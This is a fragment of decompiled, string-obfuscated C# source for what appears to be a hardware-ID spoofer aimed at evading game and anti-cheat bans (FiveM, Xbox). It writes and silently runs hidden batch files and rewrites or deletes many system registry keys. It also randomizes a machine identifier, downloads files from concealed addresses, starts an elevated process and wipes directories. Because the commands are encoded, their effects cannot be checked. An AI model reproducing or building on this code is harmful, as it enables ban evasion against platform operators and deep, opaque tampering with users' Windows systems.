		{
			Process process = Process.Start(new ProcessStartInfo(global::i.a("", 61475), global::i.a("", 62676) + a)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			process.Close();
		}

		// Token: 0x0600008C RID: 140 RVA: 0x0000B944 File Offset: 0x00009B44
		private void bk(object sender, EventArgs e)
		{
			try
			{
				if (File.Exists(global::i.a("", 62093)))
				{
					File.Move(global::i.a("", 59721), global::i.a("", 57974));
					File.Move(global::i.a("", 62012), global::i.a("", 59036));
				}
				if (Directory.Exists(global::i.a("", 63617)))
				{
					Directory.Delete(global::i.a("", 63617));
					Directory.CreateDirectory(global::i.a("", 63617));
				}
				d d = new d();
				d.b();
			}
			catch
			{
			}
			string text = Path.ChangeExtension(Path.GetTempFileName(), global::i.a("", 60653));
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine(global::i.a("", 62483));
				streamWriter.WriteLine(global::i.a("", 63051));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 57744));
				streamWriter.WriteLine(global::i.a("", 63051));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63684));
				streamWriter.WriteLine(global::i.a("", 63051));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58428));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 57397));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61141));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63466));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62497));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63469));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 60864));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59695));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59665));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58288));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62566));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 57958));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58177));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58381));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58178));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58177));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62098));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61687));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 57958));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62978));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 57958));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 60573));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59125));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63250));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62343));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 60734));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63616));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62469));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58353));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61888));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59938));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61153));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62198));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61638));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59581));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61317));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59038));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 57682));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63051));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62539));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58762));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61844));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58469));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 60112));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 61128));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 63489));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58438));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59213));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62458));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62437));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62549));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58196));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 59128));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 62397));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 60346));
				streamWriter.WriteLine(global::i.a("", 57609));
				streamWriter.WriteLine(global::i.a("", 59497));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 57981));
				streamWriter.WriteLine(global::i.a("", 57528));
				streamWriter.WriteLine(global::i.a("", 59447));
				streamWriter.WriteLine(global::i.a("", 59003));
				streamWriter.WriteLine(global::i.a("", 59079));
				streamWriter.WriteLine(global::i.a("", 61358));
				streamWriter.WriteLine(global::i.a("", 60118));
				streamWriter.WriteLine(global::i.a("", 60731));
				streamWriter.WriteLine(global::i.a("", 63661));
				streamWriter.WriteLine(global::i.a("", 61358));
				streamWriter.WriteLine(global::i.a("", 62280));
				streamWriter.WriteLine(global::i.a("", 57797));
				streamWriter.WriteLine(global::i.a("", 63598));
				streamWriter.WriteLine(global::i.a("", 61626));
				streamWriter.WriteLine(global::i.a("", 59326));
				streamWriter.WriteLine(global::i.a("", 57642));
				streamWriter.WriteLine(global::i.a("", 60170));
				streamWriter.WriteLine(global::i.a("", 63361));
				streamWriter.WriteLine(global::i.a("", 59778));
				streamWriter.WriteLine(global::i.a("", 63608));
				streamWriter.WriteLine(global::i.a("", 59218));
				streamWriter.WriteLine(global::i.a("", 60636));
				streamWriter.WriteLine(global::i.a("", 60095));
				streamWriter.WriteLine(global::i.a("", 61866));
				streamWriter.WriteLine(global::i.a("", 59654));
				streamWriter.WriteLine(global::i.a("", 58358));
				streamWriter.WriteLine(global::i.a("", 63147));
				streamWriter.WriteLine(global::i.a("", 58428));
				streamWriter.WriteLine(global::i.a("", 61811));
				streamWriter.WriteLine(global::i.a("", 63197));
				streamWriter.WriteLine(global::i.a("", 61511));
				streamWriter.WriteLine(global::i.a("", 60603));
				streamWriter.WriteLine(global::i.a("", 63387));
				streamWriter.WriteLine(global::i.a("", 61078));
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			Registry.SetValue(global::i.a("", 60925), global::i.a("", 60961), global::i.a("", 57979), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 60925), global::i.a("", 61824), global::i.a("", 57979), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 57962), global::i.a("", 61700), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58202), global::i.a("", 58779), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62141), global::i.a("", 57433), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 57561), "", global::i.a("", 62336));
			Registry.SetValue(global::i.a("", 62171), "", global::i.a("", 60471));
			Registry.SetValue(global::i.a("", 60387), global::i.a("", 58941), global::i.a("", 62065));
			Registry.SetValue(global::i.a("", 60387), global::i.a("", 60800), global::i.a("", 61845));
			Registry.SetValue(global::i.a("", 60387), global::i.a("", 63609), global::i.a("", 61913));
			Registry.SetValue(global::i.a("", 60387), global::i.a("", 58686), global::i.a("", 62940));
			Registry.SetValue(global::i.a("", 60387), global::i.a("", 62409), global::i.a("", 61845));
			Registry.SetValue(global::i.a("", 63465), global::i.a("", 57450), global::i.a("", 61913));
			Registry.SetValue(global::i.a("", 62544), global::i.a("", 59555), global::i.a("", 59234), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62544), global::i.a("", 58527), global::i.a("", 59234), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62544), global::i.a("", 57811), global::i.a("", 59234), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62544), global::i.a("", 63249), global::i.a("", 59234), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62544), global::i.a("", 63068), global::i.a("", 59234), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 63015), global::i.a("", 61454), global::i.a("", 62940));
			Registry.SetValue(global::i.a("", 59812), global::i.a("", 60080), global::i.a("", 58377), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58917), global::i.a("", 60080), global::i.a("", 58377), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58277), global::i.a("", 60080), global::i.a("", 58377), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58148), global::i.a("", 60080), global::i.a("", 58377), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60196), global::i.a("", 59027), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60196), global::i.a("", 61441), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60959), global::i.a("", 58796), 1, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58718), global::i.a("", 63332), 8, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58718), global::i.a("", 58259), 6, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58718), global::i.a("", 60656), global::i.a("", 63017), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 58718), global::i.a("", 61089), global::i.a("", 63017), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 61742), global::i.a("", 63332), 0, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61742), global::i.a("", 58259), 8, RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61742), global::i.a("", 60656), global::i.a("", 57742), RegistryValueKind.String);
			Registry.SetValue(global::i.a("", 61742), global::i.a("", 61089), global::i.a("", 63017), RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59668), true).DeleteValue(global::i.a("", 60961), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 59668), true).DeleteValue(global::i.a("", 61824), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 61310), true).DeleteValue(global::i.a("", 61700), false);
			Registry.SetValue(global::i.a("", 58202), global::i.a("", 58779), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62141), global::i.a("", 57433), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 61801), false);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 57453), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 58098), true).DeleteValue(global::i.a("", 58941), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 58098), true).DeleteValue(global::i.a("", 60800), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 58098), true).DeleteValue(global::i.a("", 58686), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 58098), true).DeleteValue(global::i.a("", 62409), false);
			Registry.SetValue(global::i.a("", 60387), global::i.a("", 63609), global::i.a("", 60958));
			Registry.SetValue(global::i.a("", 63465), global::i.a("", 57450), global::i.a("", 60958));
			Registry.CurrentUser.OpenSubKey(global::i.a("", 62413), true).DeleteValue(global::i.a("", 59555), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 62413), true).DeleteValue(global::i.a("", 58527), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 62413), true).DeleteValue(global::i.a("", 57811), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 62413), true).DeleteValue(global::i.a("", 63249), false);
			Registry.CurrentUser.OpenSubKey(global::i.a("", 62413), true).DeleteValue(global::i.a("", 63068), false);
			Registry.SetValue(global::i.a("", 63015), global::i.a("", 61454), global::i.a("", 57507));
			Registry.SetValue(global::i.a("", 59812), global::i.a("", 60080), global::i.a("", 59836), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58277), global::i.a("", 60080), global::i.a("", 59836), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58148), global::i.a("", 60080), global::i.a("", 59836), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60196), global::i.a("", 59027), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60196), global::i.a("", 61441), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60959), global::i.a("", 58796), 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 60764), true).DeleteValue(global::i.a("", 63332), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 60764), true).DeleteValue(global::i.a("", 58259), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 60764), true).DeleteValue(global::i.a("", 60656), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 60764), true).DeleteValue(global::i.a("", 61089), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59828), true).DeleteValue(global::i.a("", 63332), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59828), true).DeleteValue(global::i.a("", 58259), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59828), true).DeleteValue(global::i.a("", 60656), false);
			Registry.LocalMachine.OpenSubKey(global::i.a("", 59828), true).DeleteValue(global::i.a("", 61089), false);
			Registry.SetValue(global::i.a("", 62798), global::i.a("", 62411), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61070), global::i.a("", 60022), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60737), global::i.a("", 62887), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60737), global::i.a("", 58158), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60737), global::i.a("", 57819), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 60737), global::i.a("", 59286), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61698), global::i.a("", 63494), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62477), global::i.a("", 62025), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59641), global::i.a("", 60080), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 62896), global::i.a("", 58480), 0);
			Registry.SetValue(global::i.a("", 59663), global::i.a("", 57873), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59663), global::i.a("", 62358), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59663), global::i.a("", 57561), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59663), global::i.a("", 57571), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61040), global::i.a("", 62554), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58799), global::i.a("", 58908), 0);
			Registry.SetValue(global::i.a("", 60600), global::i.a("", 58663), 1);
			Registry.SetValue(global::i.a("", 60304), global::i.a("", 57875), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59663), global::i.a("", 59273), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58742), global::i.a("", 61039), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59663), global::i.a("", 60771), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59663), global::i.a("", 62554), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59467), global::i.a("", 63011), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 59467), global::i.a("", 60965), global::i.a("", 61913), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58264), global::i.a("", 61989), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 58264), global::i.a("", 62025), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree(global::i.a("", 61473), false);
			Registry.SetValue(global::i.a("", 61040), global::i.a("", 60483), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61040), global::i.a("", 60267), global::i.a("", 62065), RegistryValueKind.DWord);
			Registry.SetValue(global::i.a("", 61040), global::i.a("", 62074), global::i.a("", 62065), RegistryValueKind.DWord);
			string path = global::i.a("", 62007);
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists(global::i.a("", 62093)))
			{
				Process.Start(global::i.a("", 62093));
			}
			else
			{
				string text2 = global::i.a("", 62093);
				using (StreamWriter streamWriter2 = File.CreateText(text2))
				{
					streamWriter2.WriteLine(global::i.a("", 59453));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text2;
				this.d.Add(process2);
				File.SetAttributes(global::i.a("", 62093), FileAttributes.Hidden);
				process2.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
			Thread.Sleep(2000);
			string path2 = global::i.a("", 58378);
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists(global::i.a("", 59964)))
			{
				new SoundPlayer(global::i.a("", 59964)).Play();
			}
			else
			{
				string address = global::i.a("", 58952);
				string fileName = global::i.a("", 59964);
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes(global::i.a("", 59964), FileAttributes.Hidden);
				new SoundPlayer(global::i.a("", 59964)).Play();
			}
			MessageBox.Show(global::i.a("", 59150), global::i.a("", 59766), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			File.Delete(global::i.a("", 59964));
		}

		// Token: 0x0600008D RID: 141 RVA: 0x0000DC0C File Offset: 0x0000BE0C
		public static void ClickUnban()
		{
			List<Process> list = new List<Process>();
			d d = new d();
			d.b();
			string path = global::i.a("", 58885);
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists(global::i.a("", 60472)))
			{
				Process.Start(global::i.a("", 60472));
			}
			else
			{
				string text = global::i.a("", 60472);
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine(global::i.a("", 59283));
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes(global::i.a("", 60472), FileAttributes.Hidden);
				process.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
		}

		// Token: 0x0600008E RID: 142 RVA: 0x0000DD20 File Offset: 0x0000BF20
		public static string GenID(int length)
		{
			string element = global::i.a("", 58517);
			return new string(Enumerable.Repeat<string>(element, length).Select(new Func<string, char>(Main.<>c.<>9.b)).ToArray<char>());
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0000DD74 File Offset: 0x0000BF74
		public static string DiskGen(int length)
		{
			string element = global::i.a("", 60467);
			return new string(Enumerable.Repeat<string>(element, length).Select(new Func<string, char>(Main.<>c.<>9.c)).ToArray<char>());
		}

		// Token: 0x06000090 RID: 144 RVA: 0x000022D8 File Offset: 0x000004D8
		private void bl(object sender, EventArgs e)
		{
			this.ay.BringToFront();
		}

		// Token: 0x06000091 RID: 145 RVA: 0x000021A9 File Offset: 0x000003A9
		private void bm(object sender, EventArgs e)
		{
		}

		// Token: 0x06000092 RID: 146 RVA: 0x0000DDC8 File Offset: 0x0000BFC8
		private void bn(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			Main.HWIDclick();
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				global::i.a("", 60526),
				Main.GenerateString(5),
				global::i.a("", 60526),
				Main.GenerateString(5),
				global::i.a("", 60526),
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(global::i.a("", 57587), true);
			registryKey.SetValue(global::i.a("", 59950), value);
			registryKey.Close();
			Main.InstallDate();
			Main.Disk();
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.bi();
			Main.SpoofPCName();
			string path = global::i.a("", 61792);
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists(global::i.a("", 63103)))
			{
				Process.Start(global::i.a("", 63103));
			}
			else
			{
				string text = global::i.a("", 63103);
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine(global::i.a("", 62162));
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				this.d.Add(process);
				File.SetAttributes(global::i.a("", 63103), FileAttributes.Hidden);
				process.Start();
			}
			if (File.Exists(global::i.a("", 58924)))
			{
				File.Delete(global::i.a("", 58924));
			}
			if (File.Exists(global::i.a("", 59450)))
			{
				File.Delete(global::i.a("", 59450));
			}
			string text2 = this.bh.Text;
			string path2 = global::i.a("", 59925);
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists(global::i.a("", 58924)))
			{
				string text3 = global::i.a("", 59450);
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						global::i.a("", 61799),
						text2,
						global::i.a("", 59032),
						Main.DiskGen(4),
						global::i.a("", 60526),
						Main.DiskGen(4),
						global::i.a("", 59298)
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes(global::i.a("", 59450), FileAttributes.Hidden);
				process2.Start();
				File.Delete(global::i.a("", 58924));
				File.Delete(global::i.a("", 59450));
				Directory.Delete(path2);
			}
			else
			{
				string text4 = global::i.a("", 59450);
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine(string.Concat(new string[]
					{
						global::i.a("", 61799),
						text2,
						global::i.a("", 59032),
						Main.DiskGen(4),
						global::i.a("", 60526),
						Main.DiskGen(4),
						global::i.a("", 59298)
					}));
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.d.Add(process3);
				File.SetAttributes(global::i.a("", 59450), FileAttributes.Hidden);
				process3.Start();
				File.Delete(global::i.a("", 58924));
				File.Delete(global::i.a("", 59450));
				Directory.Delete(path2);
			}
			MessageBox.Show(global::i.a("", 60940), global::i.a("", 63041), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x0000E284 File Offset: 0x0000C484
		private void bo(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			if (File.Exists(global::i.a("", 62780)))
			{
				try
				{
					File.Move(global::i.a("", 62780), global::i.a("", 60304));
					File.Move(global::i.a("", 62674), global::i.a("", 58378));
				}
				catch
				{
				}
			}
			MessageBox.Show(global::i.a("", 57794), global::i.a("", 62117), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000022E5 File Offset: 0x000004E5
		private void bp(object sender, EventArgs e)
		{
			Main.FiveM();
			Main.ClickUnban();
			MessageBox.Show(global::i.a("", 59548), global::i.a("", 60554), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x000021A9 File Offset: 0x000003A9
		private void bq(object sender, EventArgs e)
		{
		}

		// Token: 0x06000096 RID: 150 RVA: 0x0000E338 File Offset: 0x0000C538
		private void br(object sender, EventArgs e)
		{
			string path = global::i.a("", 63586);
			try
			{
				string text = global::i.a("", 59576);
				string text2 = global::i.a("", 59861);
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				if (File.Exists(text2))
				{
					this.s.Image = new Bitmap(text2);
				}
				else
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(text, text2);
					this.s.Image = new Bitmap(text);
				}
				string path2 = global::i.a("", 60408);
				File.Delete(path2);
				Thread.Sleep(50);
				this.s.Image = new Bitmap(text2);
				Thread.Sleep(2000);
				DirectoryInfo directoryInfo = new DirectoryInfo(global::i.a("", 63155));
				foreach (FileInfo fileInfo in directoryInfo.GetFiles())
				{
					fileInfo.Delete();
				}
				foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
				{
					directoryInfo2.Delete(true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x000021A9 File Offset: 0x000003A9
		private void bs(object sender, EventArgs e)
		{
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000021A9 File Offset: 0x000003A9
		private void bt(object sender, EventArgs e)
		{
		}

		// Token: 0x06000099 RID: 153 RVA: 0x000021A9 File Offset: 0x000003A9
		private void bu(object sender, EventArgs e)
		{
		}

		// Token: 0x0600009A RID: 154 RVA: 0x0000E488 File Offset: 0x0000C688
		private void bv(object sender, EventArgs e)
		{
			if (File.Exists(global::i.a("", 57380)))
			{
				File.Move(global::i.a("", 60899), global::i.a("", 58761));
				File.Move(global::i.a("", 58273), global::i.a("", 60798));
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x0000E4F4 File Offset: 0x0000C6F4
		private void bw(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = global::i.a("", 63048),
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = global::i.a("", 61227),
					Arguments = global::i.a("", 59041)
				}
			}.Start();
			MessageBox.Show(global::i.a("", 59999), global::i.a("", 58124), MessageBoxButtons.OK);
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00002318 File Offset: 0x00000518
		private void bx(object sender, EventArgs e)
		{
			Process.Start(global::i.a("", 57498));
		}

		// Token: 0x0600009E RID: 158 RVA: 0x0000E5E0 File Offset: 0x0000C7E0
		private void by()
		{
			this.e = new Container();
			Animation animation = new Animation();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
			this.f = new SiticoneDragControl(this.e);
			this.g = new SiticoneControlBox();
			this.h = new SiticoneControlBox();
			this.i = new SiticoneTransition();
			this.j = new Label();
			this.k = new Label();
			this.n = new SiticoneLabel();
			this.m = new SiticoneLabel();
			this.p = new SiticoneLabel();
			this.r = new Panel();
			this.s = new PictureBox();
			this.u = new SiticoneShadowPanel();
			this.bk = new SiticoneRoundedButton();
			this.bf = new SiticoneRoundedButton();
			this.ab = new SiticoneRoundedButton();
			this.ac = new SiticoneRoundedButton();
			this.ad = new SiticoneRoundedButton();
			this.ae = new SiticoneRoundedButton();
			this.af = new SiticoneRoundedButton();
			this.ag = new SiticoneRoundedButton();
			this.ah = new SiticoneRoundedButton();
			this.v = new SiticoneLabel();
			this.w = new PictureBox();
			this.x = new Label();
			this.t = new SiticoneLabel();
			this.ai = new SiticoneShadowPanel();
			this.bq = new SiticoneLabel();
			this.br = new SiticoneTextBox();
			this.an = new SiticoneLabel();
			this.am = new SiticoneRoundedButton();
			this.aj = new SiticoneLabel();
			this.ak = new PictureBox();
			this.al = new Label();
			this.ao = new SiticoneComboBox();
			this.ap = new SiticoneShadowPanel();
			this.bo = new SiticoneLabel();
			this.bn = new SiticoneLabel();
			this.bg = new SiticoneLabel();
